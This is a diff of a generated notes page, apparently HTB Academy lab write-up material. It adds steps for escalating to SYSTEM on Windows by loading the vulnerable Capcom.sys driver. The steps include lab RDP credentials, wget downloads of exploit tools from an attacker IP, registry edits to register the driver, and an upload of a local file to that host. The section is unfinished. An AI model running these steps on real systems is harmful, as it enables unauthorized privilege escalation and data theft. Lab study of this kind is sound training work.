@@ -20602,10 +20602,25 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-19-34"><a id="__codelineno-19-34" name="__codelineno-19-34"></a>type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
 </span></code></pre></div></td></tr></table></div>
 <p>Results: Dll_abus3_ftw!  </p>
+<p><strong>RDP to  with user "printsvc" and password "HTB_@cademy_stdnt!". Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.</strong></p>
+<p>```
+xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore</p>
+<h1 id="generating-the">Generating the</h1>
+<p>wget http://10.10.14.39/EnableSeLoadDriverPrivilege.exe -outfile EnableSeLoadDriverPrivilege.exe</p>
+<p>wget http://10.10.14.39/Capcom.sys -outfile Capcom.sys</p>
+<p>wget http://10.10.14.39/DriverView.exe -outfile DriverView.exe</p>
+<p>mkdir c:\test\</p>
+<p>copy Capcom.sys c:\test\Capcom.sys</p>
+<p>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys" /f</p>
+<p>reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1 /f</p>
+<h1 id="verify-driver-is-not-loaded">Verify Driver is not Loaded</h1>
+<p>.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom</p>
+<p>Invoke-FileUpload -Uri http://10.10.14.39:8000/upload -File C:\Tools\lala\drivers\etc\hosts</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 15, 2025 20:21:43"><span class="timeago" datetime="2025-03-15T20:21:43+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 15, 2025 20:21:43">2025-03-15</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 16, 2025 16:20:58"><span class="timeago" datetime="2025-03-16T16:20:58+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 16, 2025 16:20:58">2025-03-16</span></small></br>
 
 
     <small>Created: February 23, 2025 21:12:05</small>
